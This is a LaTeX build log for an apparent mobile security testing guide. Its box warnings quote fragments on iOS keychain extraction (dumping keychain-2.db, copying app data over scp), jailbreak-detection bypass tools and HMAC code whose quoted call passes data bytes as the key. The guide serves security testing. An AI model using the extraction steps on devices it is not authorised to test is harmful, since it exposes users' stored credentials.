[]    \TU/SourceCodePro(6)/m/n/10.95 CCHmac(kCCHmacAlgSHA256, [actualData bytes
], (CC_LONG)[key length], [actualData bytes], (CC_LONG)[actualData length], [di
gestBuffer mutableBytes]);[] 

Overfull \hbox (279.50934pt too wide) in paragraph at lines 46870--46870
[]  \TU/SourceCodePro(6)/m/n/10.95 NSData* hmac = [data subdataWithRange:NSMake
Range(data.length - CC_SHA256_DIGEST_LENGTH, CC_SHA256_DIGEST_LENGTH)];[] 

Overfull \hbox (108.68939pt too wide) in paragraph at lines 46870--46870
[]  \TU/SourceCodePro(6)/m/n/10.95 NSData* actualData = [data subdataWithRange:
NSMakeRange(0, (data.length - hmac.length))];[] 

Overfull \hbox (88.9794pt too wide) in paragraph at lines 46870--46870
[]  \TU/SourceCodePro(6)/m/n/10.95 NSMutableData* digestBuffer = [NSMutableData
 dataWithLength:CC_SHA256_DIGEST_LENGTH];[] 

Overfull \hbox (483.17926pt too wide) in paragraph at lines 46870--46870
[]  \TU/SourceCodePro(6)/m/n/10.95 CCHmac(kCCHmacAlgSHA256, [actualData bytes],
 (CC_LONG)[key length], [actualData bytes], (CC_LONG)[actualData length], [dige
stBuffer mutableBytes]);[] 
[814] [815]
Overfull \hbox (255.86594pt too wide) in paragraph at lines 46996--47002
\TU/SourceSansPro(0)/m/n/10.95 side the \TU/SourceCodePro(6)/m/n/10.95 <Applica
tion>.app \TU/SourceSansPro(0)/m/n/10.95 directory. If you inspect the content 
of the \TU/SourceCodePro(6)/m/n/10.95 /var/containers/Bundle/Application/<UUID>
/<Application>.app
[816] [817] [818] [819] [820]
Overfull \hbox (16.70938pt too wide) in paragraph at lines 47265--47265
[]\TU/SourceCodePro(6)/m/n/10.95 __T07DVIA_v232JailbreakDetectionViewController
C20jailbreakTest4TappedyypF:[] 
[821]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/3f030b8c86c7c6cc516e082a4161b4b92914121b.
png" > [822] [823]
Overfull \hbox (27.5245pt too wide) in paragraph at lines 47404--47404
\TU/SourceCodePro(6)/m/n/10 (s:13SwiftSecurity30ReverseEngineeringToolsCheckerC
20amIReverseEngineeredSbyFZ)|  

Overfull \hbox (177.5245pt too wide) in paragraph at lines 47405--47405
\TU/SourceCodePro(6)/m/n/10 (s:13SwiftSecurity30ReverseEngineeringToolsCheckerC
9checkDYLD33_D6FE91E9C9AEC4D13973F8ABFC1AC788LLSbyFZ)|  

Overfull \hbox (315.5245pt too wide) in paragraph at lines 47406--47406
\TU/SourceCodePro(6)/m/n/10 (s:13SwiftSecurity30ReverseEngineeringToolsCheckerC
31checkExistenceOfSuspiciousFiles33_D6FE91E9C9AEC4D13973F8ABFC1AC788LLSbyFZ)|  

[824]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/0578a17ea75d138074bdaae5284ec9b7ebabe3ea.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/4353ea9e0ca8fb1454b4d8eb9dfa0b42c7673cf9.
png" >
Overfull \hbox (19.88026pt too wide) in paragraph at lines 47428--47430
 [][] 
[825] [826]
Overfull \hbox (15.88817pt too wide) in paragraph at lines 47525--47530
[]\TU/SourceSansPro(0)/m/n/10.95 using the UDID: \TU/SourceCodePro(6)/m/n/10.95
 [[[UIDevice currentDevice] identifierForVendor] UUIDString];

Overfull \hbox (38.16412pt too wide) in paragraph at lines 47530--47534
[]\TU/SourceSansPro(0)/m/n/10.95 Any Keychain- or filesystem-based binding, whi
ch isn’t protected by \TU/SourceCodePro(6)/m/n/10.95 SecAccessControlCreateFlag
s

Overfull \hbox (190.44939pt too wide) in paragraph at lines 47530--47534
\TU/SourceSansPro(0)/m/n/10.95 or and doesn’t use protection classes, such as \
TU/SourceCodePro(6)/m/n/10.95 kSecAttrAccessibleAlways \TU/SourceSansPro(0)/m/n
/10.95 and \TU/SourceCodePro(6)/m/n/10.95 kSecAttrAccessibleAlwaysThisDeviceOnl
y\TU/SourceSansPro(0)/m/n/10.95 . 

Overfull \hbox (204.76152pt too wide) in paragraph at lines 47573--47575
[]\TU/SourceSansPro(0)/m/n/10.95 Copy the contents of the Keychain. Since iOS 8
, this has been in \TU/SourceCodePro(6)/m/n/10.95 ~/Library/Developer/CoreSimul
ator/Devices/<Simulator
[827]
Overfull \hbox (146.45348pt too wide) in paragraph at lines 47611--47617
\TU/SourceCodePro(6)/m/n/10.95 <name of app>\TU/SourceSansPro(0)/m/n/10.95 ). T
he directory is in \TU/SourceCodePro(6)/m/n/10.95 /private/var/mobile/Container
s/Data/Application/<Application

Underfull \hbox (badness 4569) in paragraph at lines 47617--47623
[]\TU/SourceSansPro(0)/m/n/10.95 SSH into the directory indicated by the given 
command’s output or use SCP (\TU/SourceCodePro(6)/m/n/10.95 scp

Underfull \hbox (badness 10000) in paragraph at lines 47617--47623
\TU/SourceCodePro(6)/m/n/10.95 <ipaddress>:/<folder_found_in_previous_step> tar
getfolder\TU/SourceSansPro(0)/m/n/10.95 ) to

Overfull \hbox (60.89995pt too wide) in paragraph at lines 47623--47630
[]\TU/SourceSansPro(0)/m/n/10.95 Retrieve the data from the keychain, which is 
stored in \TU/SourceCodePro(6)/m/n/10.95 /private/var/Keychains/keychain-2.db\T
U/SourceSansPro(0)/m/n/10.95 ,

Underfull \hbox (badness 2726) in paragraph at lines 47623--47630
\TU/SourceSansPro(0)/m/n/10.95 which you can retrieve using the [][]keychain du
mper[][]. First make the keychain world-

Overfull \hbox (303.33284pt too wide) in paragraph at lines 47651--47662
\TU/SourceCodePro(6)/m/n/10.95 UIDevice.current.identifierForVendor?.uuidString
 \TU/SourceSansPro(0)/m/n/10.95 (in Swift3), or \TU/SourceCodePro(6)/m/n/10.95 
UIDevice.currentDevice().identifierForVendor?.UUIDString
[828]
Overfull \hbox (0.92685pt too wide) in paragraph at lines 47662--47670
\TU/SourceSansPro(0)/m/n/10.95 this data is not backed up, use \TU/SourceCodePr
o(6)/m/n/10.95 kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly

Underfull \hbox (badness 1137) in paragraph at lines 47662--47670
\TU/SourceSansPro(0)/m/n/10.95 (if you want to secure the data and properly enf
orce a passcode or Touch ID requirement),

Overfull \hbox (178.7255pt too wide) in paragraph at lines 47662--47670
\TU/SourceCodePro(6)/m/n/10.95 kSecAttrAccessibleAfterFirstUnlockThisDeviceOnly
\TU/SourceSansPro(0)/m/n/10.95 , or \TU/SourceCodePro(6)/m/n/10.95 kSecAttrAcce
ssibleWhenUnlockedThisDeviceOnly\TU/SourceSansPro(0)/m/n/10.95 . 

Overfull \hbox (160.1616pt too wide) in paragraph at lines 47674--47685
\TU/SourceCodePro(6)/m/n/10.95 kSecAttrAccessibleAfterFirstUnlockThisDeviceOnly
 \TU/SourceSansPro(0)/m/n/10.95 and \TU/SourceCodePro(6)/m/n/10.95 kSecAttrAcce
ssibleWhenUnlockedThisDeviceOnly\TU/SourceSansPro(0)/m/n/10.95 ),

Overfull \hbox (22.60417pt too wide) in paragraph at lines 47674--47685
\TU/SourceSansPro(0)/m/n/10.95 and the \TU/SourceCodePro(6)/m/n/10.95 SecAccess
ControlCreateFlags \TU/SourceSansPro(0)/m/n/10.95 is set either with \TU/Source
CodePro(6)/m/n/10.95 kSecAccessControlDevicePasscode

Overfull \hbox (120.33586pt too wide) in paragraph at lines 47674--47685
\TU/SourceSansPro(0)/m/n/10.95 (for passcodes), \TU/SourceCodePro(6)/m/n/10.95 
kSecAccessControlUserPresence \TU/SourceSansPro(0)/m/n/10.95 (passcode, Face ID
 or Touch ID), \TU/SourceCodePro(6)/m/n/10.95 kSecAccessControlBiometryAny

Underfull \hbox (badness 10000) in paragraph at lines 47692--47696
\TU/SourceSansPro(0)/m/n/10.95 - [][]$[][][][][] [] [] [] [][][][][][] [] [][][
] [] [][][][][][][][][][] [] [][][][][][] [][] [][][][][][] [][] [][][][][][][]
[] [][] [][][][][][] [] [][][][] [] [][][][][][] [] [][][][][][][][][] [][] [][
][][] [][]
[829] [830] [831]
Underfull \hbox (badness 1137) in paragraph at lines 47848--47853
[]\TU/SourceSansPro(0)/m/n/10.95 Frida: A dynamic instrumentation toolkit for d
evelopers, reverse-engineers, and security re-
[832]
Underfull \hbox (badness 3568) in paragraph at lines 47934--47938
[]\TU/SourceSansPro(0)/m/n/10.95 ClassNameDeobfuscator: Simple script to parse 
through the .smali files produced by ap-

Underfull \hbox (badness 10000) in paragraph at lines 47934--47938
\TU/SourceSansPro(0)/m/n/10.95 ktool and extract the .source annotation lines -
 [][]$[][][][][] [] [] [] [][][][][][] [] [][][] [] [][][][][][][][][][][][][][
][][] []
[833]
Overfull \hbox (11.56958pt too wide) in paragraph at lines 47976--47979
[]\TU/SourceSansPro(0)/m/n/10.95 Android Tcpdump: A command line packet capture
 utility for Android - [][]$[][][][][] [] [] [] [][][] [] [][][][][][][][][][][
][][][] []
[834]
Underfull \hbox (badness 5726) in paragraph at lines 48047--48049
[]\TU/SourceSansPro(0)/m/n/10.95 itunnel: A tool used to forward SSH via USB - 
[][]$[][][][][] [] [] [] [][][][] [] [][][][][][] [] [][][] [] [] [] [][][][][]
[][][][][][][] [][]
[835]
Underfull \hbox (badness 4060) in paragraph at lines 48170--48173
[]\TU/SourceSansPro(0)/m/n/10.95 tsProtector: A tool for bypassing Jailbreak de
tection - [][]$[][][][] [] [] [] [][][][][] [] [][][][][][] [] [][][] [] [][][]
[][][][] [] [][] []

Underfull \hbox (badness 10000) in paragraph at lines 48173--48175
[]\TU/SourceSansPro(0)/m/n/10.95 Xcon: A tool for bypassing Jailbreak detection
 - [][]$[][][][] [] [] [] [][][][][] [] [][][][][][] [] [][][] [] [][][][][][][
] [] [][][] []
[836]
Underfull \hbox (badness 2521) in paragraph at lines 48214--48217
[]\TU/SourceSansPro(0)/m/n/10.95 Burp Suite: An integrated platform for perform
ing security testing of applications - [][]$[][][][][] []

Underfull \hbox (badness 2913) in paragraph at lines 48217--48221
[]\TU/SourceSansPro(0)/m/n/10.95 Charles Proxy: HTTP proxy / HTTP monitor / Rev
erse Proxy that enables a developer to

Underfull \hbox (badness 3601) in paragraph at lines 48217--48221
\TU/SourceSansPro(0)/m/n/10.95 view all of the HTTP and SSL / HTTPS traffic bet
ween their machine and the Internet -
[837]
Underfull \hbox (badness 3209) in paragraph at lines 48272--48278
[]\TU/SourceSansPro(0)/m/n/10.95 AndroGoat: An open source vulnerable/insecure 
app using Kotlin. This app has a wide

Underfull \hbox (badness 4205) in paragraph at lines 48272--48278
\TU/SourceSansPro(0)/m/n/10.95 range of vulnerabilities related to certificate 
pinning, custom URL schemes, Android Net-

Underfull \hbox (badness 3323) in paragraph at lines 48272--48278
\TU/SourceSansPro(0)/m/n/10.95 work Security Configuration, WebViews, root dete
ction and over 20 other vulnerabilities -

Underfull \hbox (badness 1062) in paragraph at lines 48278--48281
[]\TU/SourceSansPro(0)/m/n/10.95 DVHMA: A hybrid mobile app (for Android) that 
intentionally contains vulnerabilities - [][]$[][][][][] []

Underfull \hbox (badness 1112) in paragraph at lines 48298--48302
[]\TU/SourceSansPro(0)/m/n/10.95 MSTG Android app: Java - A vulnerable Android 
app with vulnerabilities similar to the test

Underfull \hbox (badness 5274) in paragraph at lines 48320--48325
[]\TU/SourceSansPro(0)/m/n/10.95 DVIA: A vulnerable iOS app written in Objectiv
e-C which provides a platform to mobile

Underfull \hbox (badness 4132) in paragraph at lines 48320--48325
\TU/SourceSansPro(0)/m/n/10.95 security enthusiasts/professionals or students t
o test their iOS penetration testing skills -
[838]
Underfull \hbox (badness 2990) in paragraph at lines 48384--48389
[]\TU/SourceSansPro(0)/m/n/10.95 Charlie Miller, Dionysus Blazakis, Dino Dai Zo
vi, Stefan Esser, Vincenzo Iozzo, Ralf-Philipp

Underfull \hbox (badness 1917) in paragraph at lines 48384--48389
\TU/SourceSansPro(0)/m/n/10.95 Weinmann (2012) \TU/SourceSansPro(0)/m/it/10.95 
iOS Hacker’s Handbook\TU/SourceSansPro(0)/m/n/10.95 . Wiley. Available at: [][]
$[][][][][] [] [] [] [][][] [] [][][][][] [] [][][] [] [][] [][]
[839]
Underfull \hbox (badness 1642) in paragraph at lines 48406--48410
[]\TU/SourceSansPro(0)/m/n/10.95 Bruce Dang, Alexandre Gazet, Elias Backaalany 
(2014) \TU/SourceSansPro(0)/m/it/10.95 Practical Reverse Engineering\TU/SourceS
ansPro(0)/m/n/10.95 . Wiley.

Underfull \hbox (badness 1226) in paragraph at lines 48406--48410
\TU/SourceSansPro(0)/m/n/10.95 Available at: [][]$[][][][][] [] [] [] [][][] []
 [][][][][] [] [][][] [] [][] [][] [][] [] [][][][][][][][][] [] [][][][][][][]
 [] [][][][][][][][][][][] [] [][] [] [][][] [] [][] [] [][][] []

Underfull \hbox (badness 2376) in paragraph at lines 48413--48417
\TU/SourceSansPro(0)/m/n/10.95 GSEC Singapore. Available at: [][]$[][][][] [] [
] [] [][][][] [] [][][][] [] [][][] [] [][][][][][][][][] [] [][][][][][] [] []
[] [] [][] [][] [][][][][][][][][][][] []
[840]
Underfull \hbox (badness 10000) in paragraph at lines 48441--48444
[][]$[][][][][] [] [] [] [][][][][][] [] [][][] [] [][][][][] [] [][][][][] [][
] [][][][] [] [][][][][] [] [] [] [][] [] [][][][] [] [][] [] [][][][][][][][] 
[] [][][][][][] [] [][][][][][] [][] [][] [][] [][] [] [][][][][] [][]
[841] [842]
Underfull \hbox (badness 2012) in paragraph at lines 48580--48586
\TU/SourceSansPro(0)/m/n/10.95 Dump(Z/etc), Clutch, Drozer, Frida, Hopper, Ghid
ra, IDB, Ipa Installer, iFunBox, iOS-deploy,
[843] [844] [845] [846] [847]

Package longtable Warning: Table widths have changed. Rerun LaTeX.

(/tmp/tex2pdf.-b81d3c9506d190f0/input.aux)

LaTeX Warning: Label(s) may have changed. Rerun to get cross-references right.

 )
(see the transcript file for additional information)
Output written on /tmp/tex2pdf.-b81d3c9506d190f0/input.pdf (847 pages).
Transcript written on /tmp/tex2pdf.-b81d3c9506d190f0/input.log.

[makePDF] Run #2
This is XeTeX, Version 3.14159265-2.6-0.99996 (TeX Live 2016/Debian) (preloaded format=xelatex)
 restricted \write18 enabled.
entering extended mode
(/tmp/tex2pdf.-b81d3c9506d190f0/input.tex
LaTeX2e <2017/01/01> patch level 3
Babel <3.9r> and hyphenation patterns for 37 language(s) loaded.
(/usr/share/texlive/texmf-dist/tex/latex/koma-script/scrartcl.cls
Document Class: scrartcl 2016/06/14 v3.21 KOMA-Script document class (article)
(/usr/share/texlive/texmf-dist/tex/latex/koma-script/scrkbase.sty
(/usr/share/texlive/texmf-dist/tex/latex/koma-script/scrbase.sty
(/usr/share/texlive/texmf-dist/tex/latex/graphics/keyval.sty)
(/usr/share/texlive/texmf-dist/tex/latex/koma-script/scrlfile.sty
Package scrlfile, 2016/06/14 v3.21 KOMA-Script package (loading files)
                  Copyright (C) Markus Kohm

))) (/usr/share/texlive/texmf-dist/tex/latex/koma-script/tocbasic.sty)

Class scrartcl Warning: You've used obsolete option `tablecaptionabove'.
(scrartcl)              Usage of this option indicates an old document
(scrartcl)              and changes compatibility level using
(scrartcl)              `captions=tableheading,version=first,
(scrartcl)              enabledeprecatedfontcommands' that may result
(scrartcl)              in further warnings.
(scrartcl)              If you don't want this, you should simply
(scrartcl)              replace option `tablecaptionabove' by `captions=tablehe
ading'.


Class scrartcl Warning: deprecated option `enabledeprecatedfontcommands'.
(scrartcl)              Note, that this option was already depreacted when
(scrartcl)              it has been defined. Support for old font commands
(scrartcl)              has been removed from KOMA-Script more than one
(scrartcl)              decade ago. It is not recommended to use them any
(scrartcl)              longer. Therefore usage of this class option also
(scrartcl)              is not recommended.

(/usr/share/texlive/texmf-dist/tex/latex/koma-script/scrsize11pt.clo)
(/usr/share/texlive/texmf-dist/tex/latex/koma-script/typearea.sty
Package typearea, 2016/06/14 v3.21 KOMA-Script package (type area)
                  Copyright (C) Frank Neukam, 1992-1994
                  Copyright (C) Markus Kohm, 1994-

)) (/usr/share/texmf/tex/latex/lm/lmodern.sty)
(/usr/share/texlive/texmf-dist/tex/latex/setspace/setspace.sty)
(/usr/share/texlive/texmf-dist/tex/latex/amsfonts/amssymb.sty
(/usr/share/texlive/texmf-dist/tex/latex/amsfonts/amsfonts.sty))
(/usr/share/texlive/texmf-dist/tex/latex/amsmath/amsmath.sty
For additional information on amsmath, use the `?' option.
(/usr/share/texlive/texmf-dist/tex/latex/amsmath/amstext.sty
(/usr/share/texlive/texmf-dist/tex/latex/amsmath/amsgen.sty))
(/usr/share/texlive/texmf-dist/tex/latex/amsmath/amsbsy.sty)
(/usr/share/texlive/texmf-dist/tex/latex/amsmath/amsopn.sty))
(/usr/share/texlive/texmf-dist/tex/generic/ifxetex/ifxetex.sty)
(/usr/share/texlive/texmf-dist/tex/generic/oberdiek/ifluatex.sty)
(/usr/share/texlive/texmf-dist/tex/latex/unicode-math/unicode-math.sty
(/usr/share/texlive/texmf-dist/tex/latex/l3kernel/expl3.sty
(/usr/share/texlive/texmf-dist/tex/latex/l3kernel/expl3-code.tex)
(/usr/share/texlive/texmf-dist/tex/latex/l3kernel/l3xdvipdfmx.def))
(/usr/share/texlive/texmf-dist/tex/latex/ucharcat/ucharcat.sty)
(/usr/share/texlive/texmf-dist/tex/latex/l3packages/xparse/xparse.sty)
(/usr/share/texlive/texmf-dist/tex/latex/l3packages/l3keys2e/l3keys2e.sty)
(/usr/share/texlive/texmf-dist/tex/latex/fontspec/fontspec.sty
(/usr/share/texlive/texmf-dist/tex/latex/fontspec/fontspec-xetex.sty
(/usr/share/texlive/texmf-dist/tex/latex/base/fontenc.sty
(/usr/share/texlive/texmf-dist/tex/latex/base/tuenc.def))
(/usr/share/texlive/texmf-dist/tex/latex/fontspec/fontspec.cfg)))
(/usr/share/texlive/texmf-dist/tex/latex/base/fix-cm.sty
(/usr/share/texlive/texmf-dist/tex/latex/base/ts1enc.def))
(/usr/share/texlive/texmf-dist/tex/latex/filehook/filehook.sty
(/usr/share/texlive/texmf-dist/tex/latex/filehook/filehook-scrlfile.sty))
(/usr/share/texlive/texmf-dist/tex/latex/unicode-math/unicode-math-xetex.sty
(/usr/share/texlive/texmf-dist/tex/latex/unicode-math/unicode-math-table.tex)))
 (/usr/share/texlive/texmf-dist/tex/latex/upquote/upquote.sty
(/usr/share/texlive/texmf-dist/tex/latex/base/textcomp.sty
(/usr/share/texlive/texmf-dist/tex/latex/base/ts1enc.def)))
(/usr/share/texlive/texmf-dist/tex/latex/microtype/microtype.sty
(/usr/share/texlive/texmf-dist/tex/latex/microtype/microtype-xetex.def)
(/usr/share/texlive/texmf-dist/tex/latex/microtype/microtype.cfg))
(/usr/share/texlive/texmf-dist/tex/latex/xcolor/xcolor.sty
(/usr/share/texlive/texmf-dist/tex/latex/graphics-cfg/color.cfg)
(/usr/share/texlive/texmf-dist/tex/latex/graphics-def/xetex.def)
(/usr/share/texlive/texmf-dist/tex/latex/colortbl/colortbl.sty
(/usr/share/texlive/texmf-dist/tex/latex/tools/array.sty))
(/usr/share/texlive/texmf-dist/tex/latex/graphics/dvipsnam.def)
(/usr/share/texlive/texmf-dist/tex/latex/xcolor/svgnam.def)
(/usr/share/texlive/texmf-dist/tex/latex/xcolor/x11nam.def))
(/usr/share/texlive/texmf-dist/tex/latex/oberdiek/bookmark.sty
(/usr/share/texlive/texmf-dist/tex/generic/oberdiek/pdfescape.sty
(/usr/share/texlive/texmf-dist/tex/generic/oberdiek/ltxcmds.sty)
(/usr/share/texlive/texmf-dist/tex/generic/oberdiek/pdftexcmds.sty
(/usr/share/texlive/texmf-dist/tex/generic/oberdiek/infwarerr.sty)
(/usr/share/texlive/texmf-dist/tex/generic/oberdiek/ifpdf.sty)))
(/usr/share/texlive/texmf-dist/tex/generic/oberdiek/ifvtex.sty)
(/usr/share/texlive/texmf-dist/tex/latex/hyperref/hyperref.sty
(/usr/share/texlive/texmf-dist/tex/generic/oberdiek/hobsub-hyperref.sty
(/usr/share/texlive/texmf-dist/tex/generic/oberdiek/hobsub-generic.sty))
(/usr/share/texlive/texmf-dist/tex/latex/oberdiek/auxhook.sty)
(/usr/share/texlive/texmf-dist/tex/latex/oberdiek/kvoptions.sty)
(/usr/share/texlive/texmf-dist/tex/latex/hyperref/pd1enc.def)
(/usr/share/texlive/texmf-dist/tex/latex/latexconfig/hyperref.cfg)
(/usr/share/texlive/texmf-dist/tex/latex/hyperref/puenc.def)
(/usr/share/texlive/texmf-dist/tex/latex/url/url.sty))

Package hyperref Message: Driver (autodetected): hxetex.

(/usr/share/texlive/texmf-dist/tex/latex/hyperref/hxetex.def
(/usr/share/texlive/texmf-dist/tex/generic/oberdiek/stringenc.sty)
(/usr/share/texlive/texmf-dist/tex/latex/oberdiek/rerunfilecheck.sty))
(/usr/share/texlive/texmf-dist/tex/latex/oberdiek/bkm-dvipdfm.def))
(/usr/share/texlive/texmf-dist/tex/latex/geometry/geometry.sty)
(/usr/share/texlive/texmf-dist/tex/latex/fancyvrb/fancyvrb.sty
Style option: `fancyvrb' v2.7a, with DG/SPQR fixes, and firstline=lastline fix 
<2008/02/07> (tvz))
(/usr/share/texlive/texmf-dist/tex/latex/fvextra/fvextra.sty
(/usr/share/texlive/texmf-dist/tex/latex/base/ifthen.sty)
(/usr/share/texlive/texmf-dist/tex/latex/etoolbox/etoolbox.sty)
(/usr/share/texlive/texmf-dist/tex/latex/lineno/lineno.sty))
(/usr/share/texlive/texmf-dist/tex/latex/tools/longtable.sty)
(/usr/share/texlive/texmf-dist/tex/latex/booktabs/booktabs.sty)
(/usr/share/texlive/texmf-dist/tex/latex/footnotehyper/footnotehyper.sty
(/usr/share/texlive/texmf-dist/tex/latex/mdwtools/footnote.sty))
(/usr/share/texlive/texmf-dist/tex/latex/footnotebackref/footnotebackref.sty)
(/usr/share/texlive/texmf-dist/tex/latex/graphics/graphicx.sty
(/usr/share/texlive/texmf-dist/tex/latex/graphics/graphics.sty
(/usr/share/texlive/texmf-dist/tex/latex/graphics/trig.sty)
(/usr/share/texlive/texmf-dist/tex/latex/graphics-cfg/graphics.cfg)))
(/usr/share/texlive/texmf-dist/tex/latex/oberdiek/grffile.sty)
(/usr/share/texlive/texmf-dist/tex/latex/float/float.sty)
(/usr/share/texlive/texmf-dist/tex/latex/sectsty/sectsty.sty

LaTeX Warning: Command \underbar  has changed.
               Check if current package is valid.

) (/usr/share/texlive/texmf-dist/tex/latex/incgraph/incgraph.sty
(/usr/share/texlive/texmf-dist/tex/latex/pgf/utilities/pgfkeys.sty
(/usr/share/texlive/texmf-dist/tex/generic/pgf/utilities/pgfkeys.code.tex
(/usr/share/texlive/texmf-dist/tex/generic/pgf/utilities/pgfkeysfiltered.code.t
ex))) (/usr/share/texlive/texmf-dist/tex/latex/pgf/basiclayer/pgf.sty
(/usr/share/texlive/texmf-dist/tex/latex/pgf/utilities/pgfrcs.sty
(/usr/share/texlive/texmf-dist/tex/generic/pgf/utilities/pgfutil-common.tex
(/usr/share/texlive/texmf-dist/tex/generic/pgf/utilities/pgfutil-common-lists.t
ex)) (/usr/share/texlive/texmf-dist/tex/generic/pgf/utilities/pgfutil-latex.def
(/usr/share/texlive/texmf-dist/tex/latex/ms/everyshi.sty))
(/usr/share/texlive/texmf-dist/tex/generic/pgf/utilities/pgfrcs.code.tex))
(/usr/share/texlive/texmf-dist/tex/latex/pgf/basiclayer/pgfcore.sty
(/usr/share/texlive/texmf-dist/tex/latex/pgf/systemlayer/pgfsys.sty
(/usr/share/texlive/texmf-dist/tex/generic/pgf/systemlayer/pgfsys.code.tex
(/usr/share/texlive/texmf-dist/tex/generic/pgf/utilities/pgfkeys.code.tex)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/systemlayer/pgf.cfg)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/systemlayer/pgfsys-xetex.def
(/usr/share/texlive/texmf-dist/tex/generic/pgf/systemlayer/pgfsys-dvipdfmx.def
(/usr/share/texlive/texmf-dist/tex/generic/pgf/systemlayer/pgfsys-common-pdf.de
f))))
(/usr/share/texlive/texmf-dist/tex/generic/pgf/systemlayer/pgfsyssoftpath.code.
tex)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/systemlayer/pgfsysprotocol.code.
tex))
(/usr/share/texlive/texmf-dist/tex/generic/pgf/basiclayer/pgfcore.code.tex
(/usr/share/texlive/texmf-dist/tex/generic/pgf/math/pgfmath.code.tex
(/usr/share/texlive/texmf-dist/tex/generic/pgf/math/pgfmathcalc.code.tex
(/usr/share/texlive/texmf-dist/tex/generic/pgf/math/pgfmathutil.code.tex)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/math/pgfmathparser.code.tex)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/math/pgfmathfunctions.code.tex
(/usr/share/texlive/texmf-dist/tex/generic/pgf/math/pgfmathfunctions.basic.code
.tex)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/math/pgfmathfunctions.trigonomet
ric.code.tex)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/math/pgfmathfunctions.random.cod
e.tex)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/math/pgfmathfunctions.comparison
.code.tex)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/math/pgfmathfunctions.base.code.
tex)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/math/pgfmathfunctions.round.code
.tex)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/math/pgfmathfunctions.misc.code.
tex)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/math/pgfmathfunctions.integerari
thmetics.code.tex)))
(/usr/share/texlive/texmf-dist/tex/generic/pgf/math/pgfmathfloat.code.tex))
(/usr/share/texlive/texmf-dist/tex/generic/pgf/basiclayer/pgfcorepoints.code.te
x)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/basiclayer/pgfcorepathconstruct.
code.tex)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/basiclayer/pgfcorepathusage.code
.tex)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/basiclayer/pgfcorescopes.code.te
x)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/basiclayer/pgfcoregraphicstate.c
ode.tex)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/basiclayer/pgfcoretransformation
s.code.tex)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/basiclayer/pgfcorequick.code.tex
)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/basiclayer/pgfcoreobjects.code.t
ex)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/basiclayer/pgfcorepathprocessing
.code.tex)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/basiclayer/pgfcorearrows.code.te
x)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/basiclayer/pgfcoreshade.code.tex
)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/basiclayer/pgfcoreimage.code.tex

(/usr/share/texlive/texmf-dist/tex/generic/pgf/basiclayer/pgfcoreexternal.code.
tex))
(/usr/share/texlive/texmf-dist/tex/generic/pgf/basiclayer/pgfcorelayers.code.te
x)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/basiclayer/pgfcoretransparency.c
ode.tex)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/basiclayer/pgfcorepatterns.code.
tex)))
(/usr/share/texlive/texmf-dist/tex/generic/pgf/modules/pgfmoduleshapes.code.tex
) (/usr/share/texlive/texmf-dist/tex/generic/pgf/modules/pgfmoduleplot.code.tex
)
(/usr/share/texlive/texmf-dist/tex/latex/pgf/compatibility/pgfcomp-version-0-65
.sty)
(/usr/share/texlive/texmf-dist/tex/latex/pgf/compatibility/pgfcomp-version-1-18
.sty)) (/usr/share/texlive/texmf-dist/tex/latex/pgf/utilities/pgffor.sty
(/usr/share/texlive/texmf-dist/tex/latex/pgf/math/pgfmath.sty
(/usr/share/texlive/texmf-dist/tex/generic/pgf/math/pgfmath.code.tex))
(/usr/share/texlive/texmf-dist/tex/generic/pgf/utilities/pgffor.code.tex
(/usr/share/texlive/texmf-dist/tex/generic/pgf/math/pgfmath.code.tex))))
(/usr/share/texlive/texmf-dist/tex/latex/pgf/frontendlayer/tikz.sty
(/usr/share/texlive/texmf-dist/tex/generic/pgf/frontendlayer/tikz/tikz.code.tex

(/usr/share/texlive/texmf-dist/tex/generic/pgf/libraries/pgflibraryplothandlers
.code.tex)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/modules/pgfmodulematrix.code.tex
)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/frontendlayer/tikz/libraries/tik
zlibrarytopaths.code.tex)))
(/usr/share/texlive/texmf-dist/tex/latex/polyglossia/polyglossia.sty
(/usr/share/texlive/texmf-dist/tex/latex/makecmds/makecmds.sty)
(/usr/share/texlive/texmf-dist/tex/latex/xkeyval/xkeyval.sty
(/usr/share/texlive/texmf-dist/tex/generic/xkeyval/xkeyval.tex
(/usr/share/texlive/texmf-dist/tex/generic/xkeyval/xkvutils.tex))))
(/usr/share/texlive/texmf-dist/tex/latex/polyglossia/gloss-english.ldf)
(/usr/share/texlive/texmf-dist/tex/latex/csquotes/csquotes.sty
(/usr/share/texlive/texmf-dist/tex/latex/csquotes/csquotes.def)
(/usr/share/texlive/texmf-dist/tex/latex/csquotes/csquotes.cfg))
(/usr/share/texlive/texmf-dist/tex/latex/caption/caption.sty
(/usr/share/texlive/texmf-dist/tex/latex/caption/caption3.sty)
(/usr/share/texlive/texmf-dist/tex/latex/caption/ltcaption.sty))
(/usr/share/texlive/texmf-dist/tex/latex/mdframed/mdframed.sty
(/usr/share/texlive/texmf-dist/tex/latex/oberdiek/zref-abspage.sty
(/usr/share/texlive/texmf-dist/tex/latex/oberdiek/zref-base.sty))
